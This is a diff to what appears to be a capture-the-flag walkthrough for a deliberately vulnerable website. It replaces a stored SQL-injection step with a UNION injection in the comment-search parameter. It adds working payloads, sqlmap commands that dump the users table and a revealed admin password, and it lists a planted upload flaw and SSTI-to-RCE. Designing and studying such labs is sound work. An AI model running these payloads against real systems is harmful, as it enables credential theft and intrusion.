@@ -5,37 +5,62 @@ insecure upload + SSTI → RCE → user flag.
 
 ---
 
-## Step 1 — SQL injection in the comment field
+## Step 1 — SQL injection in the comment search
 
 Open any project post, e.g. `/projekte/poolbau-mit-holzdeck`, scroll to
-**Kommentar schreiben**. The comment is stored with an unparameterised
-`INSERT` (f-string). SQLite string concatenation (`||`) lets you turn the
-stored comment text into data pulled from another table.
+**Kommentare durchsuchen**. The search term is sent as the GET parameter `q`
+and concatenated straight into a `SELECT` whose rows are shown back on the
+page:
 
-**Payload in the "Kommentar" field** (any name works):
-
-```
-' || (SELECT username || ':' || password FROM users) || '
-```
-
-Submit. The new comment renders as:
-
-```
-tom-admin:@ndAouGot1t!
+```sql
+SELECT name, text, created_at FROM comments
+WHERE project_slug = '<slug>' AND text LIKE '%<q>%' ORDER BY id
 ```
 
-Variations players might use:
+The query returns **3 columns**, so a UNION pulls the `users` table into the
+results. Enter this in the search box (or as `?q=`):
 
 ```
-' || (SELECT group_concat(username||':'||password,' | ') FROM users) || '
-' || (SELECT sql FROM sqlite_master WHERE type='table') || '      -- schema
+%' UNION SELECT username, password, role FROM users-- -
+```
+
+The results list then shows:
+
+```
+tom-admin   (text column: @ndAouGot1t!)
+```
+
+Useful variants:
+
+```
+%' UNION SELECT name, sql, type FROM sqlite_master WHERE type='table'-- -   # schema
+%' UNION SELECT sqlite_version(), '', ''-- -                                 # version
+x%' OR '1'='1-- -                                                            # boolean true
 ```
 
 Verbose DB errors are shown on purpose to help tune payloads.
 
-> Why it works: `VALUES ('slug','<name>','<text>','<ts>')` is built by string
-> interpolation. `'<text>'` becomes `'' || (SELECT …) || ''`, which SQLite
-> evaluates to the subquery result before storing it.
+> Why it works: `… text LIKE '%<q>%'` is built by string interpolation.
+> `%' UNION SELECT …-- -` closes the `LIKE` string, appends a UNION with a
+> matching column count, and comments out the trailing `%'`.
+
+### With sqlmap
+
+This sink is reflected and GET-based, so sqlmap detects it (UNION / boolean;
+SQLite has no `SLEEP`, so skip time-based):
+
+```bash
+sqlmap -u "http://192.168.1.139:5015/projekte/poolbau-mit-holzdeck?q=test" \
+       -p q --dbms=sqlite --technique=UB --batch
+
+# then dump the credentials
+sqlmap -u "http://192.168.1.139:5015/projekte/poolbau-mit-holzdeck?q=test" \
+       -p q --dbms=sqlite --technique=UB --batch -T users --dump
+```
+
+> Note: the comment **POST** form is parameterised (safe) by design — the only
+> SQL injection is the `q` search parameter, so sqlmap won't flood the comments
+> table with stored payloads.
 
 ---
 
@@ -102,6 +127,6 @@ challenge design (sudo misconfig, SUID, cron, etc.).
 
 | # | Vulnerability            | Location in `app.py`                     |
 |---|--------------------------|------------------------------------------|
-| 1 | SQL injection            | `projects_detail` — f-string `INSERT`    |
+| 1 | SQL injection            | `projects_detail` — f-string `SELECT` on `?q=` search |
 | 2 | Insecure file upload     | `admin_dashboard` — no upload validation |
 | 3 | SSTI → RCE               | `blog_post` — `render_template_string`   |
